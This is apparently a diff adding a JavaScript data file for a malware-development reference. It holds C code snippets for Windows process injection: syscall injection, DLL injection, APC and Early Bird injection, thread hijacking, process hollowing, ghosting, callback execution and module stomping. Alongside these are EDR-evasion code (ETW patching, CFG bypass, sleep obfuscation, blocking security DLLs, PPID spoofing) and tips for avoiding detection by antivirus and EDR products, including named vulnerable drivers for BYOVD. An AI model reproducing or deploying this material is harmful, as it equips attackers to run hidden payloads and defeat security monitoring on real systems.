+{t:"Syscall injection chain (Nt* replacement)",l:"c",c:"// Replace every API with direct syscall\nvoid SyscallInject(DWORD pid, PBYTE sc, SIZE_T scLen) {\n    HANDLE hProc = NULL;\n    OBJECT_ATTRIBUTES oa = {sizeof(oa)};\n    CLIENT_ID cid = {(HANDLE)(ULONG_PTR)pid, NULL};\n    Syscall(SSN_NtOpenProcess, &hProc,\n        PROCESS_ALL_ACCESS, &oa, &cid);\n\n    PVOID base = NULL; SIZE_T sz = scLen;\n    Syscall(SSN_NtAllocateVirtualMemory, hProc,\n        &base, 0, &sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);\n\n    Syscall(SSN_NtWriteVirtualMemory, hProc,\n        base, sc, scLen, NULL);\n\n    PVOID p = base; SIZE_T ps = scLen; DWORD old;\n    Syscall(SSN_NtProtectVirtualMemory, hProc,\n        &p, &ps, PAGE_EXECUTE_READ, &old);\n\n    HANDLE hT;\n    Syscall(SSN_NtCreateThreadEx, &hT,\n        THREAD_ALL_ACCESS, NULL, hProc, base,\n        NULL, 0, 0, 0, 0, NULL);\n}"},
+{t:"Find process by name",l:"c",c:"DWORD FindProc(LPCSTR name) {\n    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    PROCESSENTRY32 pe = {sizeof(pe)};\n    DWORD pid = 0;\n    if (Process32First(snap, &pe)) {\n        do {\n            if (_stricmp(pe.szExeFile, name) == 0) {\n                pid = pe.th32ProcessID; break;\n            }\n        } while (Process32Next(snap, &pe));\n    }\n    CloseHandle(snap);\n    return pid;\n}"}
+];
+C.dll=[
+{t:"DLL injection via LoadLibraryA",l:"c",c:"void DllInject(DWORD pid, LPCSTR dllPath) {\n    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n    SIZE_T pathLen = strlen(dllPath) + 1;\n    PVOID remote = VirtualAllocEx(hProc, NULL, pathLen,\n        MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);\n    WriteProcessMemory(hProc, remote, dllPath, pathLen, NULL);\n\n    // LoadLibraryA addr same in all procs (ASLR base shared)\n    FARPROC pLoad = GetProcAddress(\n        GetModuleHandleA(\"kernel32.dll\"), \"LoadLibraryA\");\n    HANDLE hT = CreateRemoteThread(hProc, NULL, 0,\n        (LPTHREAD_START_ROUTINE)pLoad, remote, 0, NULL);\n    WaitForSingleObject(hT, INFINITE);\n    VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);\n    CloseHandle(hT); CloseHandle(hProc);\n}"},
+{t:"SetWindowsHookEx injection",l:"c",c:"// In injector:\nHMODULE hDll = LoadLibraryA(\"hook.dll\");\nHOOKPROC hp = (HOOKPROC)GetProcAddress(hDll, \"HookProc\");\nHHOOK hHook = SetWindowsHookEx(WH_KEYBOARD, hp, hDll,\n    targetThreadId); // 0 = all threads\n\n// In hook.dll:\n__declspec(dllexport) LRESULT CALLBACK HookProc(\n    int nCode, WPARAM wParam, LPARAM lParam) {\n    if (nCode >= 0) {\n        // Running in target's context\n    }\n    return CallNextHookEx(NULL, nCode, wParam, lParam);\n}"},
+{t:"Reflective DLL loader concept",l:"c",c:"// Export inside the DLL itself (position-independent)\nDWORD ReflectiveLoader(VOID) {\n    PBYTE base = FindOwnBase(); // walk back to 'MZ'\n    PIMAGE_NT_HEADERS nt = GetNtHeaders(base);\n\n    PVOID newBase = VirtualAlloc(NULL,\n        nt->OptionalHeader.SizeOfImage,\n        MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);\n\n    memcpy(newBase, base, nt->OptionalHeader.SizeOfHeaders);\n    CopySections(base, newBase, nt);\n    ProcessRelocations(newBase, nt);\n    ResolveImports(newBase, nt);\n    SetPermissions(newBase, nt);\n\n    // Call DllMain\n    ((DllMain_t)(newBase +\n        nt->OptionalHeader.AddressOfEntryPoint))\n        ((HMODULE)newBase, DLL_PROCESS_ATTACH, NULL);\n    return (DWORD)(ULONG_PTR)newBase;\n}"}
+];
+C.shc=[
+{t:"APC injection",l:"c",c:"void ApcInject(DWORD pid, DWORD tid, PBYTE sc, SIZE_T len) {\n    HANDLE hP = OpenProcess(PROCESS_VM_OPERATION|\n        PROCESS_VM_WRITE, FALSE, pid);\n    HANDLE hT = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);\n    PVOID r = VirtualAllocEx(hP, NULL, len,\n        MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);\n    WriteProcessMemory(hP, r, sc, len, NULL);\n    DWORD old;\n    VirtualProtectEx(hP, r, len, PAGE_EXECUTE_READ, &old);\n    QueueUserAPC((PAPCFUNC)r, hT, 0);\n    // Thread must enter alertable state to fire\n    CloseHandle(hT); CloseHandle(hP);\n}"},
+{t:"Early Bird injection",l:"c",c:"void EarlyBird(PBYTE sc, SIZE_T len) {\n    STARTUPINFO si = {sizeof(si)};\n    PROCESS_INFORMATION pi;\n    CreateProcessA(\"C:\\\\Windows\\\\System32\\\\svchost.exe\",\n        NULL, NULL, NULL, FALSE,\n        CREATE_SUSPENDED|CREATE_NO_WINDOW, NULL, NULL, &si, &pi);\n\n    PVOID r = VirtualAllocEx(pi.hProcess, NULL, len,\n        MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);\n    WriteProcessMemory(pi.hProcess, r, sc, len, NULL);\n    DWORD old;\n    VirtualProtectEx(pi.hProcess, r, len, PAGE_EXECUTE_READ, &old);\n\n    QueueUserAPC((PAPCFUNC)r, pi.hThread, 0);\n    ResumeThread(pi.hThread); // APC fires before main\n    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);\n}"},
+{t:"Thread hijacking",l:"c",c:"void Hijack(DWORD pid, DWORD tid, PBYTE sc, SIZE_T len) {\n    HANDLE hP = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n    HANDLE hT = OpenThread(THREAD_SUSPEND_RESUME|\n        THREAD_GET_CONTEXT|THREAD_SET_CONTEXT, FALSE, tid);\n    SuspendThread(hT);\n\n    PVOID r = VirtualAllocEx(hP, NULL, len,\n        MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    WriteProcessMemory(hP, r, sc, len, NULL);\n\n    CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL;\n    GetThreadContext(hT, &ctx);\n    ctx.Rip = (DWORD64)r; // shellcode should JMP back\n    SetThreadContext(hT, &ctx);\n    ResumeThread(hT);\n    CloseHandle(hT); CloseHandle(hP);\n}"},
+{t:"NtQueueApcThreadEx (Special User APC)",l:"c",c:"typedef NTSTATUS(NTAPI* NtQueueApcThreadEx_t)(\n    HANDLE hThread, ULONG ApcType,\n    PVOID ApcRoutine, PVOID Arg1, PVOID Arg2, PVOID Arg3);\n\nvoid SpecialApc(DWORD pid, DWORD tid, PBYTE sc, SIZE_T len) {\n    HANDLE hP = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n    HANDLE hT = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);\n    PVOID r = VirtualAllocEx(hP, NULL, len,\n        MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READ);\n    WriteProcessMemory(hP, r, sc, len, NULL);\n\n    NtQueueApcThreadEx_t pFn = (NtQueueApcThreadEx_t)\n        GetProcAddress(GetModuleHandleA(\"ntdll.dll\"),\n        \"NtQueueApcThreadEx\");\n    pFn(hT, 1, r, NULL, NULL, NULL); // 1 = SPECIAL\n    // Executes immediately, no alertable wait!\n    CloseHandle(hT); CloseHandle(hP);\n}"}
+];
+C.hol=[
+{t:"Process hollowing (full)",l:"c",c:"void Hollow(LPCSTR target, PBYTE pay, SIZE_T payLen) {\n    STARTUPINFO si = {sizeof(si)};\n    PROCESS_INFORMATION pi;\n    CreateProcessA(target, NULL, NULL, NULL, FALSE,\n        CREATE_SUSPENDED, NULL, NULL, &si, &pi);\n\n    CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL;\n    GetThreadContext(pi.hThread, &ctx);\n    // PEB in RDX after creation (x64)\n    PVOID imageBase;\n    ReadProcessMemory(pi.hProcess,\n        (PBYTE)ctx.Rdx + 0x10, &imageBase, 8, NULL);\n\n    NtUnmapViewOfSection(pi.hProcess, imageBase);\n\n    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)\n        ((PBYTE)pay + ((PIMAGE_DOS_HEADER)pay)->e_lfanew);\n    PVOID nb = VirtualAllocEx(pi.hProcess, imageBase,\n        nt->OptionalHeader.SizeOfImage,\n        MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);\n    WriteProcessMemory(pi.hProcess, nb, pay,\n        nt->OptionalHeader.SizeOfHeaders, NULL);\n\n    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);\n    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)\n        WriteProcessMemory(pi.hProcess,\n            (PBYTE)nb + sec[i].VirtualAddress,\n            (PBYTE)pay + sec[i].PointerToRawData,\n            sec[i].SizeOfRawData, NULL);\n\n    ctx.Rcx = (DWORD64)((PBYTE)nb +\n        nt->OptionalHeader.AddressOfEntryPoint);\n    WriteProcessMemory(pi.hProcess,\n        (PBYTE)ctx.Rdx + 0x10, &nb, 8, NULL);\n    SetThreadContext(pi.hThread, &ctx);\n    ResumeThread(pi.hThread);\n}"},
+{t:"Process ghosting skeleton",l:"c",c:"void Ghost(PBYTE pay, SIZE_T payLen) {\n    HANDLE hFile = CreateFileA(\"C:\\\\Temp\\\\g.exe\",\n        GENERIC_READ|GENERIC_WRITE|DELETE,\n        0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n\n    // Mark delete BEFORE writing\n    FILE_DISPOSITION_INFORMATION fdi = {TRUE};\n    IO_STATUS_BLOCK iosb;\n    NtSetInformationFile(hFile, &iosb, &fdi,\n        sizeof(fdi), FileDispositionInformation);\n\n    DWORD w; WriteFile(hFile, pay, payLen, &w, NULL);\n\n    HANDLE hSec;\n    NtCreateSection(&hSec, SECTION_ALL_ACCESS,\n        NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);\n    CloseHandle(hFile); // file deleted, section persists\n\n    HANDLE hProc;\n    NtCreateProcessEx(&hProc, PROCESS_ALL_ACCESS,\n        NULL, (HANDLE)-1, 0, hSec, NULL, NULL, 0);\n    // Create thread + set PEB params + resume...\n}"}
+];
+C.cbk=[
+{t:"CreateTimerQueueTimer",l:"c",c:"void TimerInject(PVOID scAddr) {\n    HANDLE hTimer, hQueue = CreateTimerQueue();\n    CreateTimerQueueTimer(&hTimer, hQueue,\n        (WAITORTIMERCALLBACK)scAddr,\n        NULL, 0, 0, WT_EXECUTEINTIMERTHREAD);\n}\n\n// Self-injection:\nPVOID x = VirtualAlloc(NULL, scLen,\n    MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);\nmemcpy(x, sc, scLen);\nTimerInject(x);"},
+{t:"Thread pool work item",l:"c",c:"void PoolInject(PVOID scAddr) {\n    PTP_WORK w = CreateThreadpoolWork(\n        (PTP_WORK_CALLBACK)scAddr, NULL, NULL);\n    SubmitThreadpoolWork(w);\n    WaitForThreadpoolWorkCallbacks(w, FALSE);\n    CloseThreadpoolWork(w);\n}\n// Callback sig: VOID CALLBACK(PTP_CALLBACK_INSTANCE,\n//   PVOID Context, PTP_WORK Work)\n// Shellcode must handle params on stack"},
+{t:"EnumWindows callback",l:"c",c:"PVOID x = VirtualAlloc(NULL, scLen,\n    MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);\nmemcpy(x, sc, scLen);\n\n// EnumWindowsProc sig: BOOL CALLBACK(HWND, LPARAM)\nEnumWindows((WNDENUMPROC)x, 0);\n\n// Other callbacks:\n// EnumChildWindows(hParent, (WNDENUMPROC)x, 0)\n// EnumDesktopWindows(hDesktop, (WNDENUMPROC)x, 0)\n// EnumFonts(hDC, NULL, (FONTENUMPROC)x, 0)\n// EnumDisplayMonitors(NULL,NULL,(MONITORENUMPROC)x,0)"},
+{t:"KernelCallbackTable hijack",l:"c",c:"void KCTInject(HANDLE hProc, PVOID scAddr) {\n    PROCESS_BASIC_INFORMATION pbi;\n    NtQueryInformationProcess(hProc, 0, &pbi, sizeof(pbi), NULL);\n\n    // Read KernelCallbackTable from PEB+0x58 (x64)\n    PVOID kcTable;\n    ReadProcessMemory(hProc,\n        (PBYTE)pbi.PebBaseAddress + 0x58,\n        &kcTable, 8, NULL);\n\n    // Copy + modify table\n    PVOID tbl[100];\n    ReadProcessMemory(hProc, kcTable, tbl, sizeof(tbl), NULL);\n    tbl[FN_COPYDATA_IDX] = scAddr; // overwrite entry\n\n    PVOID newTbl = VirtualAllocEx(hProc, NULL,\n        sizeof(tbl), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);\n    WriteProcessMemory(hProc, newTbl, tbl, sizeof(tbl), NULL);\n\n    // Point PEB to our table\n    WriteProcessMemory(hProc,\n        (PBYTE)pbi.PebBaseAddress + 0x58, &newTbl, 8, NULL);\n\n    // Trigger: WM_COPYDATA dispatches through modified table\n    COPYDATASTRUCT cds = {0};\n    SendMessageA(targetHwnd, WM_COPYDATA, 0, (LPARAM)&cds);\n}"}
+];
+C.adv=[
+{t:"Module stomping",l:"c",c:"void ModuleStomp(PBYTE sc, SIZE_T scLen) {\n    HMODULE hDecoy = LoadLibraryExA(\n        \"C:\\\\Windows\\\\System32\\\\amsi.dll\",\n        NULL, DONT_RESOLVE_DLL_REFERENCES);\n    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)\n        ((PBYTE)hDecoy + ((PIMAGE_DOS_HEADER)hDecoy)->e_lfanew);\n    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);\n    PVOID text = NULL;\n    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)\n        if (memcmp(sec[i].Name, \".text\", 5) == 0) {\n            text = (PBYTE)hDecoy + sec[i].VirtualAddress; break;\n        }\n    DWORD old;\n    VirtualProtect(text, scLen, PAGE_READWRITE, &old);\n    memcpy(text, sc, scLen);\n    VirtualProtect(text, scLen, PAGE_EXECUTE_READ, &old);\n    ((void(*)())text)();\n}"},
+{t:"Mapping injection (shared section, no WriteProcessMemory)",l:"c",c:"void MapInject(HANDLE hProc, PBYTE sc, SIZE_T scLen) {\n    HANDLE hSec; LARGE_INTEGER mx = {scLen};\n    NtCreateSection(&hSec, SECTION_ALL_ACCESS,\n        NULL, &mx, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);\n\n    PVOID local = NULL; SIZE_T lsz = 0;\n    NtMapViewOfSection(hSec, (HANDLE)-1,\n        &local, 0, 0, NULL, &lsz, 2, 0, PAGE_READWRITE);\n\n    PVOID remote = NULL; SIZE_T rsz = 0;\n    NtMapViewOfSection(hSec, hProc,\n        &remote, 0, 0, NULL, &rsz, 2, 0, PAGE_EXECUTE_READ);\n\n    memcpy(local, sc, scLen); // write local, appears remote\n\n    HANDLE hT;\n    NtCreateThreadEx(&hT, THREAD_ALL_ACCESS,\n        NULL, hProc, remote, NULL, 0,0,0,0,NULL);\n    NtUnmapViewOfSection((HANDLE)-1, local);\n}"},
+{t:"Mockingjay (find RWX sections)",l:"c",c:"PVOID FindRWX(void) {\n    HMODULE mods[256]; DWORD needed;\n    EnumProcessModules(GetCurrentProcess(),\n        mods, sizeof(mods), &needed);\n    for (DWORD i = 0; i < needed/sizeof(HMODULE); i++) {\n        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)\n            ((PBYTE)mods[i]+((PIMAGE_DOS_HEADER)mods[i])->e_lfanew);\n        PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);\n        for (WORD j = 0; j < nt->FileHeader.NumberOfSections; j++)\n            if ((s[j].Characteristics & 0xE0000000) == 0xE0000000)\n                return (PBYTE)mods[i] + s[j].VirtualAddress;\n    }\n    return NULL; // try LoadLibrary(\"msys-2.0.dll\")\n}"}
+];
+C.sys=[
+{t:"Indirect syscall injection",l:"c",c:"// Each syscall: JMP to ntdll's syscall;ret gadget\nextern PVOID ntdllGadget; // 0F 05 C3 in ntdll\n\nvoid IndirectInject(DWORD pid, PBYTE sc, SIZE_T scLen) {\n    DWORD sO = HalosGate(\"NtOpenProcess\");\n    DWORD sA = HalosGate(\"NtAllocateVirtualMemory\");\n    DWORD sW = HalosGate(\"NtWriteVirtualMemory\");\n    DWORD sP = HalosGate(\"NtProtectVirtualMemory\");\n    DWORD sT = HalosGate(\"NtCreateThreadEx\");\n\n    HANDLE hP = NULL;\n    CLIENT_ID cid = {(HANDLE)(ULONG_PTR)pid};\n    OBJECT_ATTRIBUTES oa = {sizeof(oa)};\n    IndirectSyscall(&hP, PROCESS_ALL_ACCESS, &oa, &cid, sO);\n\n    PVOID b = NULL; SIZE_T sz = scLen;\n    IndirectSyscall(hP, &b, 0, &sz,\n        MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE, sA);\n    IndirectSyscall(hP, b, sc, scLen, NULL, sW);\n\n    PVOID p = b; SIZE_T ps = scLen; DWORD old;\n    IndirectSyscall(hP, &p, &ps, PAGE_EXECUTE_READ, &old, sP);\n\n    HANDLE hT;\n    IndirectSyscall(&hT, THREAD_ALL_ACCESS, NULL, hP,\n        b, NULL, 0,0,0,0,NULL, sT);\n}"},
+{t:"Section mapping via syscall (zero WriteProcessMemory)",l:"c",c:"void MapSyscallInject(DWORD pid, PBYTE sc, SIZE_T scLen) {\n    HANDLE hP; // NtOpenProcess...\n    HANDLE hSec; LARGE_INTEGER mx = {scLen};\n    Syscall(SSN_NtCreateSection, &hSec, SECTION_ALL_ACCESS,\n        NULL, &mx, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);\n\n    PVOID local = NULL, remote = NULL;\n    SIZE_T lsz = 0, rsz = 0;\n    Syscall(SSN_NtMapViewOfSection, hSec, (HANDLE)-1,\n        &local, 0,0,NULL, &lsz, 2, 0, PAGE_READWRITE);\n    Syscall(SSN_NtMapViewOfSection, hSec, hP,\n        &remote, 0,0,NULL, &rsz, 2, 0, PAGE_EXECUTE_READ);\n\n    memcpy(local, sc, scLen); // local write only\n\n    HANDLE hT;\n    Syscall(SSN_NtCreateThreadEx, &hT, THREAD_ALL_ACCESS,\n        NULL, hP, remote, NULL, 0,0,0,0,NULL);\n    Syscall(SSN_NtUnmapViewOfSection, (HANDLE)-1, local);\n}"}
+];
+C.kit=[
+{t:"Process enum via NtQuerySystemInformation",l:"c",c:"DWORD FindProcNt(LPCWSTR name) {\n    ULONG bufSz = 1 << 20;\n    PVOID buf = VirtualAlloc(NULL, bufSz,\n        MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);\n    NtQuerySystemInformation(5, buf, bufSz, NULL);\n    PSYSTEM_PROCESS_INFORMATION p = buf;\n    while (1) {\n        if (p->ImageName.Buffer &&\n            _wcsicmp(p->ImageName.Buffer, name) == 0)\n            return (DWORD)(ULONG_PTR)p->UniqueProcessId;\n        if (!p->NextEntryOffset) break;\n        p = (PSYSTEM_PROCESS_INFORMATION)\n            ((PBYTE)p + p->NextEntryOffset);\n    }\n    VirtualFree(buf, 0, MEM_RELEASE);\n    return 0;\n}"},
+{t:"Handle duplication from csrss",l:"c",c:"// Bypass OpenProcess monitoring\nDWORD csrssPid = FindProc(L\"csrss.exe\");\nHANDLE hCsrss = OpenProcess(PROCESS_DUP_HANDLE,\n    FALSE, csrssPid);\n\n// Enumerate handles via NtQuerySystemInformation\n// (SystemHandleInformation class 16)\n// Find handle to target PID in csrss\n\nHANDLE hTarget = NULL;\nNtDuplicateObject(\n    hCsrss,         // source process\n    remoteHandle,   // handle in csrss\n    (HANDLE)-1,     // our process\n    &hTarget,       // duplicated\n    PROCESS_ALL_ACCESS, 0, 0);"},
+{t:"Enable SeDebugPrivilege",l:"c",c:"BOOL EnableDebug(void) {\n    HANDLE hTok;\n    OpenProcessToken(GetCurrentProcess(),\n        TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hTok);\n    TOKEN_PRIVILEGES tp;\n    tp.PrivilegeCount = 1;\n    LookupPrivilegeValueA(NULL, \"SeDebugPrivilege\",\n        &tp.Privileges[0].Luid);\n    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n    AdjustTokenPrivileges(hTok, FALSE, &tp, 0, NULL, NULL);\n    BOOL ok = (GetLastError() == ERROR_SUCCESS);\n    CloseHandle(hTok);\n    return ok;\n}"},
+{t:"PPID spoofing",l:"c",c:"void SpoofParent(DWORD fakePid, LPCSTR cmd) {\n    HANDLE hFake = OpenProcess(PROCESS_CREATE_PROCESS,\n        FALSE, fakePid);\n    SIZE_T sz;\n    InitializeProcThreadAttributeList(NULL, 1, 0, &sz);\n    LPPROC_THREAD_ATTRIBUTE_LIST al = HeapAlloc(\n        GetProcessHeap(), 0, sz);\n    InitializeProcThreadAttributeList(al, 1, 0, &sz);\n    UpdateProcThreadAttribute(al, 0,\n        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,\n        &hFake, sizeof(HANDLE), NULL, NULL);\n\n    STARTUPINFOEXA si = {0};\n    si.StartupInfo.cb = sizeof(si);\n    si.lpAttributeList = al;\n    PROCESS_INFORMATION pi;\n    CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE,\n        EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED,\n        NULL, NULL, &si.StartupInfo, &pi);\n    // pi appears as child of fakePid\n    DeleteProcThreadAttributeList(al);\n    CloseHandle(hFake);\n}"},
+{t:"Find alertable threads",l:"c",c:"// For APC injection: need alertable thread\n// Check WaitReason via NtQuerySystemInformation\n//\n// SYSTEM_THREAD_INFORMATION.WaitReason:\n//   5 = UserRequest (SleepEx, WaitFor*Ex)\n// Thread in state Waiting + WaitReason 5 = alertable\n//\n// Thread array follows each SYSTEM_PROCESS_INFORMATION:\n//   p->NumberOfThreads entries of SYSTEM_THREAD_INFORMATION\n//\n// Filter:\n//   if (thread.ThreadState == 5 && // Waiting\n//       thread.WaitReason == 5)    // UserRequest\n//       -> likely alertable, good APC target"}
+];
+C.byp=[
+{t:"ETW blind before injection",l:"c",c:"void BlindETW(void) {\n    HMODULE hNt = GetModuleHandleA(\"ntdll.dll\");\n    PVOID pEtw = GetProcAddress(hNt, \"EtwEventWrite\");\n    BYTE patch[] = {0x48, 0x33, 0xC0, 0xC3}; // xor rax,rax; ret\n    PVOID a = pEtw; SIZE_T s = 4; DWORD old;\n    NtProtectVirtualMemory((HANDLE)-1, &a, &s,\n        PAGE_EXECUTE_READWRITE, &old);\n    memcpy(pEtw, patch, 4);\n    NtProtectVirtualMemory((HANDLE)-1, &a, &s, old, &old);\n}\n// Call BEFORE injection chain\n// Optionally restore after to avoid integrity checks"},
+{t:"CFG bypass - register call target",l:"c",c:"typedef struct { ULONG_PTR Offset; ULONG_PTR Flags; }\n    CFG_CALL_TARGET_INFO;\n#define CFG_CALL_TARGET_VALID 1\n\nvoid CfgAllow(PVOID base, SIZE_T regionSz, PVOID target) {\n    CFG_CALL_TARGET_INFO info;\n    info.Offset = (ULONG_PTR)target - (ULONG_PTR)base;\n    info.Flags = CFG_CALL_TARGET_VALID;\n    SetProcessValidCallTargets(GetCurrentProcess(),\n        base, regionSz, 1, &info);\n}\n// Call before callback-based execution:\n// CfgAllow(allocBase, allocSz, shellcodeAddr);"},
+{t:"Sleep obfuscation (Ekko-style concept)",l:"c",c:"void SleepEncrypt(PVOID pay, SIZE_T len, DWORD ms) {\n    BYTE key[16];\n    BCryptGenRandom(NULL, key, 16,\n        BCRYPT_USE_SYSTEM_PREFERRED_RNG);\n\n    // XOR encrypt in-place\n    for (SIZE_T i = 0; i < len; i++)\n        ((PBYTE)pay)[i] ^= key[i % 16];\n\n    // Change to RW during sleep (no execute)\n    DWORD old;\n    VirtualProtect(pay, len, PAGE_READWRITE, &old);\n\n    // ... sleep ... (timer-based wake)\n    // On wake: decrypt, VirtualProtect(RX), continue\n    // Memory scanner sees encrypted RW during sleep\n}"},
+{t:"Block EDR DLLs with CIG",l:"c",c:"SIZE_T sz;\nInitializeProcThreadAttributeList(NULL, 1, 0, &sz);\nLPPROC_THREAD_ATTRIBUTE_LIST al = malloc(sz);\nInitializeProcThreadAttributeList(al, 1, 0, &sz);\n\nDWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_\n    BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;\nUpdateProcThreadAttribute(al, 0,\n    PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,\n    &policy, sizeof(policy), NULL, NULL);\n\nSTARTUPINFOEXA si = {0};\nsi.StartupInfo.cb = sizeof(si);\nsi.lpAttributeList = al;\nCreateProcessA(NULL, \"svchost.exe\", NULL, NULL, FALSE,\n    EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED,\n    NULL, NULL, &si.StartupInfo, &pi);\n// EDR DLL cannot load! Use shellcode, not DLL injection"}
+];
+return C[s]||[];
+}
+
+var TR={
+crt:[
+{t:"Never use PROCESS_ALL_ACCESS",d:"Request minimum rights: VM_OPERATION|VM_WRITE|CREATE_THREAD. 0x1F0FFF is an instant red flag."},
+{t:"RW then RX, never RWX",d:"Allocate PAGE_READWRITE, write, then VirtualProtectEx to PAGE_EXECUTE_READ. RWX is a primary EDR signal."},
+{t:"Delay between steps",d:"Don't alloc-write-execute in rapid succession. Add realistic delays. Rapid API chain is a behavioral signature."},
+{t:"HideFromDebugger on threads",d:"NtCreateThreadEx with THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER (0x4). Thread won't appear in debugger."}
+],
+dll:[
+{t:"Reflective > LoadLibrary",d:"LoadLibrary leaves DLL in PEB module list and on disk. Reflective avoids both - no registration, no disk."},
+{t:"SetWindowsHookEx looks legitimate",d:"DLL load triggered by system, not explicit injection. Less suspicious in behavior logs."},
+{t:"UNICODE_STRING for LdrLoadDll",d:"Path must be UNICODE_STRING struct (Length, MaxLength, Buffer*). All three fields in remote memory."}
+],
+shc:[
+{t:"Early Bird beats EDR init",d:"Suspended process has no hooks yet. APC fires during init, before ntdll hooks installed. Race condition you usually win."},
+{t:"Thread hijacking = minimal artifacts",d:"No new thread, no APC, no callback. Only Suspend/Get/Set/ResumeContext. Minimal telemetry footprint."},
+{t:"Find alertable threads intelligently",d:"NtQuerySystemInformation: ThreadState=5 (Waiting) + WaitReason=5 (UserRequest) = likely alertable."},
+{t:"Special User APC is undermonitored",d:"NtQueueApcThreadEx added in Win10 RS5. Many EDRs don't specifically monitor it. Immediate execution."}
+],
+hol:[
+{t:"Doppelg\u00E4nging defeats file scanning",d:"Payload in transacted file, section created, transaction rolled back. File never persists. AV has nothing to scan."},
+{t:"Ghosting wins the delete race",d:"File marked for delete BEFORE payload written. File deleted before AV can open it. Section persists."},
+{t:"Herpaderping: section vs file divergence",d:"Section cached from original content. Overwriting file fools AV that scans after section creation."},
+{t:"Hollowing: check memory type",d:"Hollowed processes have private memory at image base instead of image-backed. Memory forensics detects this."}
+],
+cbk:[
+{t:"Callbacks avoid CreateRemoteThread",d:"No thread creation API. Callback triggered by normal Windows operations. Harder to attribute to injection."},
+{t:"KernelCallbackTable: powerful but fragile",d:"Modifying PEB->KernelCallbackTable gives execution via messages. Some EDRs check it. Wrong entry = crash."},
+{t:"FLS callbacks fire on cleanup",d:"FlsAlloc registers callback for FlsFree/thread exit. No explicit execution call needed."},
+{t:"Match callback signatures",d:"Each API expects specific func signature. Wrong params on stack = crash. Prepend a small stub to adjust."}
+],
+adv:[
+{t:"Module stomping stays image-backed",d:"VAD type remains image-backed (vs private for VirtualAlloc). Memory scanners see known module backing."},
+{t:"Mapping eliminates WriteProcessMemory",d:"Shared sections: write locally, execute remotely. NtWriteVirtualMemory is heavily monitored. memcpy generates zero cross-process events."},
+{t:"Mockingjay needs the right DLL",d:"Few DLLs have RWX sections. msys-2.0.dll and cygwin1.dll do. LoadLibrary one if needed."},
+{t:"Atom bombing avoids classic APIs",d:"Global atom table is shared. GlobalAddAtom + GlobalGetAtomName APC avoids VirtualAllocEx and WriteProcessMemory."}
+],
+sys:[
+{t:"Kernel ETW still fires",d:"Syscalls bypass usermode hooks but not kernel EtwTi callbacks. Combine with ETW patch + section mapping."},
+{t:"Vary syscall gadgets per call",d:"Collect all 0F 05 C3 in ntdll, pick randomly each call. Fixed gadget offset becomes a signature."},
+{t:"Mapping reduces syscall count",d:"Classic: 5 syscalls. Mapping: 4 syscalls. Fewer cross-process syscalls = fewer kernel ETW events."}
+],
+kit:[
+{t:"svchost.exe is best blend-in",d:"Multiple instances as SYSTEM. Many threads per instance. Your injected thread blends with existing workers."},
+{t:"PPID spoofing hides true parent",d:"EDRs track parent-child. Spoof parent to services.exe (normal for svchost). Use PROC_THREAD_ATTRIBUTE_PARENT_PROCESS."},
+{t:"Handle duplication bypasses OpenProcess",d:"If OpenProcess hooked, duplicate from csrss.exe via NtDuplicateObject. Less monitored path."},
+{t:"CIG blocks EDR usermode DLLs",d:"BLOCK_NON_MICROSOFT_BINARIES prevents EDR hooks loading. But also blocks YOUR DLLs - shellcode only."}
+],
+byp:[
+{t:"Sleep obfuscation beats memory scanning",d:"Encrypt payload during sleep. Scanner sees encrypted RW blob. Timer wake decrypts, protects RX, executes."},
+{t:"CFG is increasingly enforced",d:"Callback targets must be in CFG bitmap. Register with SetProcessValidCallTargets before execution."},
+{t:"CIG blocks all non-MS DLLs equally",d:"Your DLLs blocked too. Must use shellcode injection if CIG enabled on target."},
+{t:"PPL requires kernel access",d:"BYOVD to patch EPROCESS.Protection. Popular: dbutil_2_3.sys, RTCore64.sys."},
